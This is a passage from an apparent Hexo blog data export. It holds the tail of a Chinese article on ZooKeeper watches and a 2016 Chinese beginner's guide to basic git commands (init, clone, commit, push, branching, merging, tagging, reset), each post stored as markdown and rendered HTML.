&#x672C;&#x8EAB;&#x63D0;&#x4F9B;&#x4E86;&#x4FDD;&#x5E8F;&#x6027;(ordering guarantee)&#xFF1A;&#x5373;&#x5BA2;&#x6237;&#x7AEF;&#x53EA;&#x6709;&#x9996;&#x5148;&#x770B;&#x5230;&#x4E86;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x540E;&#xFF0C;&#x624D;&#x4F1A;&#x611F;&#x77E5;&#x5230;&#x5B83;&#x6240;&#x8BBE;&#x7F6E;&#x76D1;&#x89C6;&#x7684; znode &#x53D1;&#x751F;&#x4E86;&#x53D8;&#x5316;(a client will never see a change for which it has set a watch until it first sees the watch event). &#x7F51;&#x7EDC;&#x5EF6;&#x8FDF;&#x6216;&#x8005;&#x5176;&#x4ED6;&#x56E0;&#x7D20;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x4E0D;&#x540C;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x65F6;&#x523B;&#x611F;&#x77E5;&#x67D0;&#x4E00;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x540C;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x6240;&#x770B;&#x5230;&#x7684;&#x4E00;&#x5207;&#x5177;&#x6709;&#x4E00;&#x81F4;&#x7684;&#x987A;&#x5E8F;&#x3002;</p>\n</li>\n<li><p>The data for which the watch was set&#xFF08;&#x88AB;&#x8BBE;&#x7F6E; watch &#x7684;&#x6570;&#x636E;&#xFF09;</p>\n<p>&#x8FD9;&#x610F;&#x5473;&#x7740; znode &#x8282;&#x70B9;&#x672C;&#x8EAB;&#x5177;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x6539;&#x53D8;&#x65B9;&#x5F0F;&#x3002;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x60F3;&#x8C61; Zookeeper &#x7EF4;&#x62A4;&#x4E86;&#x4E24;&#x6761;&#x76D1;&#x89C6;&#x94FE;&#x8868;&#xFF1A;&#x6570;&#x636E;&#x76D1;&#x89C6;&#x548C;&#x5B50;&#x8282;&#x70B9;&#x76D1;&#x89C6;(data watches and child watches) getData() and exists() &#x8BBE;&#x7F6E;&#x6570;&#x636E;&#x76D1;&#x89C6;&#xFF0C;getChildren() &#x8BBE;&#x7F6E;&#x5B50;&#x8282;&#x70B9;&#x76D1;&#x89C6;&#x3002; &#x6216;&#x8005;&#xFF0C;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x60F3;&#x8C61; Zookeeper &#x8BBE;&#x7F6E;&#x7684;&#x4E0D;&#x540C;&#x76D1;&#x89C6;&#x8FD4;&#x56DE;&#x4E0D;&#x540C;&#x7684;&#x6570;&#x636E;&#xFF0C;getData() &#x548C; exists() &#x8FD4;&#x56DE; znode &#x8282;&#x70B9;&#x7684;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#xFF0C;&#x800C; getChildren() &#x8FD4;&#x56DE;&#x5B50;&#x8282;&#x70B9;&#x5217;&#x8868;&#x3002;&#x56E0;&#x6B64;&#xFF0C; setData() &#x4F1A;&#x89E6;&#x53D1;&#x8BBE;&#x7F6E;&#x5728;&#x67D0;&#x4E00;&#x8282;&#x70B9;&#x4E0A;&#x6240;&#x8BBE;&#x7F6E;&#x7684;&#x6570;&#x636E;&#x76D1;&#x89C6;(&#x5047;&#x5B9A;&#x6570;&#x636E;&#x8BBE;&#x7F6E;&#x6210;&#x529F;)&#xFF0C;&#x800C;&#x4E00;&#x6B21;&#x6210;&#x529F;&#x7684; create() &#x64CD;&#x4F5C;&#x5219;&#x4F1A;&#x51FA;&#x53D1;&#x5F53;&#x524D;&#x8282;&#x70B9;&#x4E0A;&#x6240;&#x8BBE;&#x7F6E;&#x7684;&#x6570;&#x636E;&#x76D1;&#x89C6;&#x4EE5;&#x53CA;&#x7236;&#x8282;&#x70B9;&#x7684;&#x5B50;&#x8282;&#x70B9;&#x76D1;&#x89C6;&#x3002;&#x4E00;&#x6B21;&#x6210;&#x529F;&#x7684; delete() &#x64CD;&#x4F5C;&#x5C06;&#x4F1A;&#x89E6;&#x53D1;&#x5F53;&#x524D;&#x8282;&#x70B9;&#x7684;&#x6570;&#x636E;&#x76D1;&#x89C6;&#x548C;&#x5B50;&#x8282;&#x70B9;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#xFF0C;&#x540C;&#x65F6;&#x4E5F;&#x4F1A;&#x89E6;&#x53D1;&#x8BE5;&#x8282;&#x70B9;&#x7236;&#x8282;&#x70B9;&#x7684;child watch&#x3002;</p>\n</li>\n</ul>\n<p>Zookeeper &#x4E2D;&#x7684;&#x76D1;&#x89C6;&#x662F;&#x8F7B;&#x91CF;&#x7EA7;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x5BB9;&#x6613;&#x8BBE;&#x7F6E;&#x3001;&#x7EF4;&#x62A4;&#x548C;&#x5206;&#x53D1;&#x3002;&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x4E0E; Zookeeper &#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5931;&#x53BB;&#x8054;&#x7CFB;&#x65F6;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x5E76;&#x4E0D;&#x4F1A;&#x6536;&#x5230;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x7684;&#x901A;&#x77E5;&#xFF0C;&#x53EA;&#x6709;&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x91CD;&#x65B0;&#x8FDE;&#x63A5;&#x540E;&#xFF0C;&#x82E5;&#x5728;&#x5FC5;&#x8981;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4EE5;&#x524D;&#x6CE8;&#x518C;&#x7684;&#x76D1;&#x89C6;&#x4F1A;&#x91CD;&#x65B0;&#x88AB;&#x6CE8;&#x518C;&#x5E76;&#x89E6;&#x53D1;&#xFF0C;&#x5BF9;&#x4E8E;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x6765;&#x8BF4; &#x8FD9;&#x901A;&#x5E38;&#x662F;&#x900F;&#x660E;&#x7684;&#x3002;&#x53EA;&#x6709;&#x4E00;&#x79CD;&#x60C5;&#x51B5;&#x4F1A;&#x5BFC;&#x81F4;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x7684;&#x4E22;&#x5931;&#xFF0C;&#x5373;&#xFF1A;&#x901A;&#x8FC7; exists() &#x8BBE;&#x7F6E;&#x4E86;&#x67D0;&#x4E2A; znode &#x8282;&#x70B9;&#x7684;&#x76D1;&#x89C6;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x67D0;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x6B64; znode &#x8282;&#x70B9;&#x88AB;&#x521B;&#x5EFA;&#x548C;&#x5220;&#x9664;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x5185;&#x4E0E; zookeeper &#x670D;&#x52A1;&#x5668;&#x5931;&#x53BB;&#x4E86;&#x8054;&#x7CFB;&#xFF0C;&#x8BE5;&#x5BA2;&#x6237;&#x7AEF;&#x5373;&#x4F7F;&#x7A0D;&#x540E;&#x91CD;&#x65B0;&#x8FDE;&#x63A5; zookeeper&#x670D;&#x52A1;&#x5668;&#x540E;&#x4E5F;&#x5F97;&#x4E0D;&#x5230;&#x4E8B;&#x4EF6;&#x901A;&#x77E5;</p>"},{"title":"git使用简易指南","date":"2016-07-20T13:18:00.000Z","toc":false,"_content":"\n### 安装\n[下载 git OSX 版](http://code.google.com/p/git-osx-installer/downloads/list?can=3)\n[下载 git Windows 版](https://code.google.com/hosting/moved?project=msysgit)\n[下载 git Linux 版](https://git-scm.com/book/en%2FGetting-Started-Installing-Git)\n\n### 创建新仓库\n创建新文件夹，打开，然后执行\n```bash\ngit init\n```\n以创建新的 git 仓库。\n\n### 检出仓库\n执行如下命令以创建一个本地仓库的克隆版本：\n```bash\ngit clone /path/to/repository \n```\n如果是远端服务器上的仓库，你的命令会是这个样子：\n```bash\ngit clone username@host:/path/to/repository\n```\n\n### 工作流\n你的本地仓库由 git 维护的三棵“树”组成。第一个是你的**工作目录**，它持有实际文件；第二个是 **缓存区（Index）**，它像个缓存区域，临时保存你的改动；最后是**HEAD**，指向你最近一次提交后的结果。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/git%E4%BD%BF%E7%94%A8%E7%AE%80%E6%98%93%E6%8C%87%E5%8D%97/1.png)\n<!-- more -->\n\n### 添加与提交\n你可以计划改动（把它们添加到缓存区），使用如下命令：\n```bash\ngit add <filename>\ngit add *\n```\n这是 git 基本工作流程的第一步；使用如下命令以实际提交改动：\n```bash\ngit commit -m \"代码提交信息\"\n```\n现在，你的改动已经提交到了 HEAD，但是还没到你的远端仓库。\n\n### 推送改动\n你的改动现在已经在本地仓库的 HEAD 中了。执行如下命令以将这些改动提交到远端仓库：\n```bash\ngit push origin master\n```\n可以把 master 换成你想要推送的任何分支。 \n\n如果你还没有克隆现有仓库，并欲将你的仓库连接到某个远程服务器，你可以使用如下命令添加：\n```bash\ngit remote add origin <server>\n```\n如此你就能够将你的改动推送到所添加的服务器上去了。\n\n### 分支\n分支是用来将特性开发绝缘开来的。在你创建仓库的时候，master 是“默认的”。在其他分支上进行开发，完成后再将它们合并到主分支上。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/git%E4%BD%BF%E7%94%A8%E7%AE%80%E6%98%93%E6%8C%87%E5%8D%97/2.png)\n\n创建一个叫做“feature_x”的分支，并切换过去：\n```bash\ngit checkout -b feature_x\n```\n切换回主分支：\n```bash\ngit checkout master\n```\n再把新建的分支删掉：\n```bash\ngit branch -d feature_x\n```\n除非你将分支推送到远端仓库，不然该分支就是 不为他人所见的：\n```bash\ngit push origin <branch>\n```\n\n### 更新与合并\n要更新你的本地仓库至最新改动，执行：\n```bash\ngit pull\n```\n以在你的工作目录中 获取（fetch） 并 合并（merge） 远端的改动。\n要合并其他分支到你的当前分支（例如 master），执行：\n```bash\ngit merge <branch>\n```\n两种情况下，git 都会尝试去自动合并改动。不幸的是，自动合并并非次次都能成功，并可能导致 冲突（conflicts）。 这时候就需要你修改这些文件来人肉合并这些 冲突（conflicts） 了。改完之后，你需要执行如下命令以将它们标记为合并成功：\n```bash\ngit add <filename>\n```\n在合并改动之前，也可以使用如下命令查看：\n```bash\ngit diff <source_branch> <target_branch>\n```\n\n### 标签\n在软件发布时创建标签，是被推荐的。这是个旧有概念，在 SVN 中也有。可以执行如下命令以创建一个叫做 1.0.0 的标签：\n```bash\ngit tag 1.0.0 1b2e1d63ff\n```\n1b2e1d63ff 是你想要标记的提交 ID 的前 10 位字符。使用如下命令获取提交 ID：\n```bash\ngit log\n```\n你也可以用该提交 ID 的少一些的前几位，只要它是唯一的。\n\n### 替换本地改动\n假如你做错事（自然，这是不可能的），你可以使用如下命令替换掉本地改动：\n```bash\ngit checkout -- <filename>\n```\n此命令会使用 HEAD 中的最新内容替换掉你的工作目录中的文件。已添加到缓存区的改动，以及新文件，都不受影响。\n\n假如你想要丢弃你所有的本地改动与提交，可以到服务器上获取最新的版本并将你本地主分支指向到它：\n```bash\ngit fetch origin\ngit reset --hard origin/master\n```\n\n### 有用的贴士\n内建的图形化 git：\n```bash\ngitk\n```\n彩色的 git 输出：\n```bash\ngit config color.ui true\n```\n显示历史记录时，只显示一行注释信息：\n```bash\ngit config format.pretty oneline\n```\n交互地添加文件至缓存区：\n```bash\ngit add -i\n```\n\n### 链接与资源\n**图形化界面**\n[GitX (L) (OSX, open source)](http://gitx.laullon.com/)\n[Tower (OSX)](http://www.git-tower.com/)\n[Source Tree (OSX, free)](http://www.sourcetreeapp.com/)\n[GitHub for Mac (OSX, free)](http://mac.github.com/)\n[GitBox (OSX)](https://itunes.apple.com/gb/app/gitbox/id403388357?mt=12)\n\n**指南与手册**\n[Git 社区参考书](https://git-scm.com/book/en/v2)\n[专业 Git](http://progit.org/book/)\n[如 git 思考](http://think-like-a-git.net/)\n[GitHub 帮助](http://help.github.com/)\n[图形化的 Git 指南一则](http://marklodato.github.com/visual-git-guide/index-en.html)\n","source":"_posts/git使用简易指南.md","raw":"---\ntitle: git使用简易指南\ncategories:\n  - 其他技术\ntags:\n  - git\ndate: 2016-7-20 21:18:00\ntoc: false\n\n---\n\n### 安装\n[下载 git OSX 版](http://code.google.com/p/git-osx-installer/downloads/list?can=3)\n[下载 git Windows 版](https://code.google.com/hosting/moved?project=msysgit)\n[下载 git Linux 版](https://git-scm.com/book/en%2FGetting-Started-Installing-Git)\n\n### 创建新仓库\n创建新文件夹，打开，然后执行\n```bash\ngit init\n```\n以创建新的 git 仓库。\n\n### 检出仓库\n执行如下命令以创建一个本地仓库的克隆版本：\n```bash\ngit clone /path/to/repository \n```\n如果是远端服务器上的仓库，你的命令会是这个样子：\n```bash\ngit clone username@host:/path/to/repository\n```\n\n### 工作流\n你的本地仓库由 git 维护的三棵“树”组成。第一个是你的**工作目录**，它持有实际文件；第二个是 **缓存区（Index）**，它像个缓存区域，临时保存你的改动；最后是**HEAD**，指向你最近一次提交后的结果。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/git%E4%BD%BF%E7%94%A8%E7%AE%80%E6%98%93%E6%8C%87%E5%8D%97/1.png)\n<!-- more -->\n\n### 添加与提交\n你可以计划改动（把它们添加到缓存区），使用如下命令：\n```bash\ngit add <filename>\ngit add *\n```\n这是 git 基本工作流程的第一步；使用如下命令以实际提交改动：\n```bash\ngit commit -m \"代码提交信息\"\n```\n现在，你的改动已经提交到了 HEAD，但是还没到你的远端仓库。\n\n### 推送改动\n你的改动现在已经在本地仓库的 HEAD 中了。执行如下命令以将这些改动提交到远端仓库：\n```bash\ngit push origin master\n```\n可以把 master 换成你想要推送的任何分支。 \n\n如果你还没有克隆现有仓库，并欲将你的仓库连接到某个远程服务器，你可以使用如下命令添加：\n```bash\ngit remote add origin <server>\n```\n如此你就能够将你的改动推送到所添加的服务器上去了。\n\n### 分支\n分支是用来将特性开发绝缘开来的。在你创建仓库的时候，master 是“默认的”。在其他分支上进行开发，完成后再将它们合并到主分支上。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/git%E4%BD%BF%E7%94%A8%E7%AE%80%E6%98%93%E6%8C%87%E5%8D%97/2.png)\n\n创建一个叫做“feature_x”的分支，并切换过去：\n```bash\ngit checkout -b feature_x\n```\n切换回主分支：\n```bash\ngit checkout master\n```\n再把新建的分支删掉：\n```bash\ngit branch -d feature_x\n```\n除非你将分支推送到远端仓库，不然该分支就是 不为他人所见的：\n```bash\ngit push origin <branch>\n```\n\n### 更新与合并\n要更新你的本地仓库至最新改动，执行：\n```bash\ngit pull\n```\n以在你的工作目录中 获取（fetch） 并 合并（merge） 远端的改动。\n要合并其他分支到你的当前分支（例如 master），执行：\n```bash\ngit merge <branch>\n```\n两种情况下，git 都会尝试去自动合并改动。不幸的是，自动合并并非次次都能成功，并可能导致 冲突（conflicts）。 这时候就需要你修改这些文件来人肉合并这些 冲突（conflicts） 了。改完之后，你需要执行如下命令以将它们标记为合并成功：\n```bash\ngit add <filename>\n```\n在合并改动之前，也可以使用如下命令查看：\n```bash\ngit diff <source_branch> <target_branch>\n```\n\n### 标签\n在软件发布时创建标签，是被推荐的。这是个旧有概念，在 SVN 中也有。可以执行如下命令以创建一个叫做 1.0.0 的标签：\n```bash\ngit tag 1.0.0 1b2e1d63ff\n```\n1b2e1d63ff 是你想要标记的提交 ID 的前 10 位字符。使用如下命令获取提交 ID：\n```bash\ngit log\n```\n你也可以用该提交 ID 的少一些的前几位，只要它是唯一的。\n\n### 替换本地改动\n假如你做错事（自然，这是不可能的），你可以使用如下命令替换掉本地改动：\n```bash\ngit checkout -- <filename>\n```\n此命令会使用 HEAD 中的最新内容替换掉你的工作目录中的文件。已添加到缓存区的改动，以及新文件，都不受影响。\n\n假如你想要丢弃你所有的本地改动与提交，可以到服务器上获取最新的版本并将你本地主分支指向到它：\n```bash\ngit fetch origin\ngit reset --hard origin/master\n```\n\n### 有用的贴士\n内建的图形化 git：\n```bash\ngitk\n```\n彩色的 git 输出：\n```bash\ngit config color.ui true\n```\n显示历史记录时，只显示一行注释信息：\n```bash\ngit config format.pretty oneline\n```\n交互地添加文件至缓存区：\n```bash\ngit add -i\n```\n\n### 链接与资源\n**图形化界面**\n[GitX (L) (OSX, open source)](http://gitx.laullon.com/)\n[Tower (OSX)](http://www.git-tower.com/)\n[Source Tree (OSX, free)](http://www.sourcetreeapp.com/)\n[GitHub for Mac (OSX, free)](http://mac.github.com/)\n[GitBox (OSX)](https://itunes.apple.com/gb/app/gitbox/id403388357?mt=12)\n\n**指南与手册**\n[Git 社区参考书](https://git-scm.com/book/en/v2)\n[专业 Git](http://progit.org/book/)\n[如 git 思考](http://think-like-a-git.net/)\n[GitHub 帮助](http://help.github.com/)\n[图形化的 Git 指南一则](http://marklodato.github.com/visual-git-guide/index-en.html)\n","slug":"git使用简易指南","published":1,"updated":"2016-11-17T11:59:42.673Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulcq002wgwtmudj9at01","content":"<h3 id=\"&#x5B89;&#x88C5;\"><a href=\"#&#x5B89;&#x88C5;\" class=\"headerlink\" title=\"&#x5B89;&#x88C5;\"></a>&#x5B89;&#x88C5;</h3><p><a href=\"http://code.google.com/p/git-osx-installer/downloads/list?can=3\" target=\"_blank\" rel=\"external\">&#x4E0B;&#x8F7D; git OSX &#x7248;</a><br><a href=\"https://code.google.com/hosting/moved?project=msysgit\" target=\"_blank\" rel=\"external\">&#x4E0B;&#x8F7D; git Windows &#x7248;</a><br><a href=\"https://git-scm.com/book/en%2FGetting-Started-Installing-Git\" target=\"_blank\" rel=\"external\">&#x4E0B;&#x8F7D; git Linux &#x7248;</a></p>\n<h3 id=\"&#x521B;&#x5EFA;&#x65B0;&#x4ED3;&#x5E93;\"><a href=\"#&#x521B;&#x5EFA;&#x65B0;&#x4ED3;&#x5E93;\" class=\"headerlink\" title=\"&#x521B;&#x5EFA;&#x65B0;&#x4ED3;&#x5E93;\"></a>&#x521B;&#x5EFA;&#x65B0;&#x4ED3;&#x5E93;</h3><p>&#x521B;&#x5EFA;&#x65B0;&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x6253;&#x5F00;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git init</span><br></pre></td></tr></table></figure></p>\n<p>&#x4EE5;&#x521B;&#x5EFA;&#x65B0;&#x7684; git &#x4ED3;&#x5E93;&#x3002;</p>\n<h3 id=\"&#x68C0;&#x51FA;&#x4ED3;&#x5E93;\"><a href=\"#&#x68C0;&#x51FA;&#x4ED3;&#x5E93;\" class=\"headerlink\" title=\"&#x68C0;&#x51FA;&#x4ED3;&#x5E93;\"></a>&#x68C0;&#x51FA;&#x4ED3;&#x5E93;</h3><p>&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4EE5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x672C;&#x5730;&#x4ED3;&#x5E93;&#x7684;&#x514B;&#x9686;&#x7248;&#x672C;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> /path/to/repository</span><br></pre></td></tr></table></figure></p>\n<p>&#x5982;&#x679C;&#x662F;&#x8FDC;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x4ED3;&#x5E93;&#xFF0C;&#x4F60;&#x7684;&#x547D;&#x4EE4;&#x4F1A;&#x662F;&#x8FD9;&#x4E2A;&#x6837;&#x5B50;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> username@host:/path/to/repository</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"&#x5DE5;&#x4F5C;&#x6D41;\"><a href=\"#&#x5DE5;&#x4F5C;&#x6D41;\" class=\"headerlink\" title=\"&#x5DE5;&#x4F5C;&#x6D41;\"></a>&#x5DE5;&#x4F5C;&#x6D41;</h3><p>&#x4F60;&#x7684;&#x672C;&#x5730;&#x4ED3;&#x5E93;&#x7531; git &#x7EF4;&#x62A4;&#x7684;&#x4E09;&#x68F5;&#x201C;&#x6811;&#x201D;&#x7EC4;&#x6210;&#x3002;&#x7B2C;&#x4E00;&#x4E2A;&#x662F;&#x4F60;&#x7684;<strong>&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;</strong>&#xFF0C;&#x5B83;&#x6301;&#x6709;&#x5B9E;&#x9645;&#x6587;&#x4EF6;&#xFF1B;&#x7B2C;&#x4E8C;&#x4E2A;&#x662F; <strong>&#x7F13;&#x5B58;&#x533A;&#xFF08;Index&#xFF09;</strong>&#xFF0C;&#x5B83;&#x50CF;&#x4E2A;&#x7F13;&#x5B58;&#x533A;&#x57DF;&#xFF0C;&#x4E34;&#x65F6;&#x4FDD;&#x5B58;&#x4F60;&#x7684;&#x6539;&#x52A8;&#xFF1B;&#x6700;&#x540E;&#x662F;<strong>HEAD</strong>&#xFF0C;&#x6307;&#x5411;&#x4F60;&#x6700;&#x8FD1;&#x4E00;&#x6B21;&#x63D0;&#x4EA4;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/git%E4%BD%BF%E7%94%A8%E7%AE%80%E6%98%93%E6%8C%87%E5%8D%97/1.png\" alt=\"\"><br><a id=\"more\"></a></p>\n<h3 id=\"&#x6DFB;&#x52A0;&#x4E0E;&#x63D0;&#x4EA4;\"><a href=\"#&#x6DFB;&#x52A0;&#x4E0E;&#x63D0;&#x4EA4;\" class=\"headerlink\" title=\"&#x6DFB;&#x52A0;&#x4E0E;&#x63D0;&#x4EA4;\"></a>&#x6DFB;&#x52A0;&#x4E0E;&#x63D0;&#x4EA4;</h3><p>&#x4F60;&#x53EF;&#x4EE5;&#x8BA1;&#x5212;&#x6539;&#x52A8;&#xFF08;&#x628A;&#x5B83;&#x4EEC;&#x6DFB;&#x52A0;&#x5230;&#x7F13;&#x5B58;&#x533A;&#xFF09;&#xFF0C;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add &lt;filename&gt;</span><br><span class=\"line\">git add *</span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD9;&#x662F; git &#x57FA;&#x672C;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;&#x7684;&#x7B2C;&#x4E00;&#x6B65;&#xFF1B;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4EE5;&#x5B9E;&#x9645;&#x63D0;&#x4EA4;&#x6539;&#x52A8;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git commit -m <span class=\"string\">&quot;&#x4EE3;&#x7801;&#x63D0;&#x4EA4;&#x4FE1;&#x606F;&quot;</span></span><br></pre></td></tr></table></figure></p>\n<p>&#x73B0;&#x5728;&#xFF0C;&#x4F60;&#x7684;&#x6539;&#x52A8;&#x5DF2;&#x7ECF;&#x63D0;&#x4EA4;&#x5230;&#x4E86; HEAD&#xFF0C;&#x4F46;&#x662F;&#x8FD8;&#x6CA1;&#x5230;&#x4F60;&#x7684;&#x8FDC;&#x7AEF;&#x4ED3;&#x5E93;&#x3002;</p>\n<h3 id=\"&#x63A8;&#x9001;&#x6539;&#x52A8;\"><a href=\"#&#x63A8;&#x9001;&#x6539;&#x52A8;\" class=\"headerlink\" title=\"&#x63A8;&#x9001;&#x6539;&#x52A8;\"></a>&#x63A8;&#x9001;&#x6539;&#x52A8;</h3><p>&#x4F60;&#x7684;&#x6539;&#x52A8;&#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x5728;&#x672C;&#x5730;&#x4ED3;&#x5E93;&#x7684; HEAD &#x4E2D;&#x4E86;&#x3002;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4EE5;&#x5C06;&#x8FD9;&#x4E9B;&#x6539;&#x52A8;&#x63D0;&#x4EA4;&#x5230;&#x8FDC;&#x7AEF;&#x4ED3;&#x5E93;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push origin master</span><br></pre></td></tr></table></figure></p>\n<p>&#x53EF;&#x4EE5;&#x628A; master &#x6362;&#x6210;&#x4F60;&#x60F3;&#x8981;&#x63A8;&#x9001;&#x7684;&#x4EFB;&#x4F55;&#x5206;&#x652F;&#x3002; </p>\n<p>&#x5982;&#x679C;&#x4F60;&#x8FD8;&#x6CA1;&#x6709;&#x514B;&#x9686;&#x73B0;&#x6709;&#x4ED3;&#x5E93;&#xFF0C;&#x5E76;&#x6B32;&#x5C06;&#x4F60;&#x7684;&#x4ED3;&#x5E93;&#x8FDE;&#x63A5;&#x5230;&#x67D0;&#x4E2A;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x6DFB;&#x52A0;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git remote add origin &lt;server&gt;</span><br></pre></td></tr></table></figure></p>\n<p>&#x5982;&#x6B64;&#x4F60;&#x5C31;&#x80FD;&#x591F;&#x5C06;&#x4F60;&#x7684;&#x6539;&#x52A8;&#x63A8;&#x9001;&#x5230;&#x6240;&#x6DFB;&#x52A0;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x53BB;&#x4E86;&#x3002;</p>\n<h3 id=\"&#x5206;&#x652F;\"><a href=\"#&#x5206;&#x652F;\" class=\"headerlink\" title=\"&#x5206;&#x652F;\"></a>&#x5206;&#x652F;</h3><p>&#x5206;&#x652F;&#x662F;&#x7528;&#x6765;&#x5C06;&#x7279;&#x6027;&#x5F00;&#x53D1;&#x7EDD;&#x7F18;&#x5F00;&#x6765;&#x7684;&#x3002;&#x5728;&#x4F60;&#x521B;&#x5EFA;&#x4ED3;&#x5E93;&#x7684;&#x65F6;&#x5019;&#xFF0C;master &#x662F;&#x201C;&#x9ED8;&#x8BA4;&#x7684;&#x201D;&#x3002;&#x5728;&#x5176;&#x4ED6;&#x5206;&#x652F;&#x4E0A;&#x8FDB;&#x884C;&#x5F00;&#x53D1;&#xFF0C;&#x5B8C;&#x6210;&#x540E;&#x518D;&#x5C06;&#x5B83;&#x4EEC;&#x5408;&#x5E76;&#x5230;&#x4E3B;&#x5206;&#x652F;&#x4E0A;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/git%E4%BD%BF%E7%94%A8%E7%AE%80%E6%98%93%E6%8C%87%E5%8D%97/2.png\" alt=\"\"></p>\n<p>&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x53EB;&#x505A;&#x201C;feature_x&#x201D;&#x7684;&#x5206;&#x652F;&#xFF0C;&#x5E76;&#x5207;&#x6362;&#x8FC7;&#x53BB;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout -b feature_x</span><br></pre></td></tr></table></figure></p>\n<p>&#x5207;&#x6362;&#x56DE;&#x4E3B;&#x5206;&#x652F;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master</span><br></pre></td></tr></table></figure></p>\n<p>&#x518D;&#x628A;&#x65B0;&#x5EFA;&#x7684;&#x5206;&#x652F;&#x5220;&#x6389;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch <span class=\"_\">-d</span> feature_x</span><br></pre></td></tr></table></figure></p>\n<p>&#x9664;&#x975E;&#x4F60;&#x5C06;&#x5206;&#x652F;&#x63A8;&#x9001;&#x5230;&#x8FDC;&#x7AEF;&#x4ED3;&#x5E93;&#xFF0C;&#x4E0D;&#x7136;&#x8BE5;&#x5206;&#x652F;&#x5C31;&#x662F; &#x4E0D;&#x4E3A;&#x4ED6;&#x4EBA;&#x6240;&#x89C1;&#x7684;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push origin &lt;branch&gt;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"&#x66F4;&#x65B0;&#x4E0E;&#x5408;&#x5E76;\"><a href=\"#&#x66F4;&#x65B0;&#x4E0E;&#x5408;&#x5E76;\" class=\"headerlink\" 